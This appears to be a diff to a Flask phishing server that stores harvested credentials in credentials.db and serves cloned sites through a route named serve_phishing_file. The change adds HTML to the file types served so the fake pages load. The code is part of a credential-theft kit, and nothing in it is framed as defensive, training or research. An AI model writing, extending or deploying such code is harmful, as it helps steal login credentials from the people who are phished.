@@ -24,7 +24,7 @@ app.secret_key = 'phishing_server_professional_2024'
 SITES_DIR = 'sites'
 LOGOS_DIR = 'logos'
 CREDENTIALS_DB = 'credentials.db'
-STATIC_FILES = ['css', 'js', 'png', 'jpg', 'jpeg', 'gif', 'svg', 'ico', 'woff', 'woff2', 'ttf', 'eot', 'json', 'xml', 'txt', 'asc', 'map', 'webp', 'bmp', 'tiff', 'pdf', 'zip', 'rar', 'mp4', 'mp3', 'wav', 'avi', 'mov', 'webm', 'ogg', 'download']
+STATIC_FILES = ['css', 'js', 'png', 'jpg', 'jpeg', 'gif', 'svg', 'ico', 'woff', 'woff2', 'ttf', 'eot', 'json', 'xml', 'txt', 'asc', 'map', 'webp', 'bmp', 'tiff', 'pdf', 'zip', 'rar', 'mp4', 'mp3', 'wav', 'avi', 'mov', 'webm', 'ogg', 'download', 'html']
 deployed_sites = set()  # Sitios actualmente desplegados
 
 # Lock para thread safety
@@ -200,7 +200,7 @@ def serve_phishing_file(site_name, filename):
         if len(parts) >= 2:
             actual_ext = parts[-2].lower()
     
-    if file_ext in STATIC_FILES or actual_ext in ['js', 'css']:
+    if file_ext in STATIC_FILES or actual_ext in ['js', 'css', 'html']:
         try:
             # Para archivos en subcarpetas, usar send_from_directory con el directorio padre
             directory = os.path.dirname(file_path)
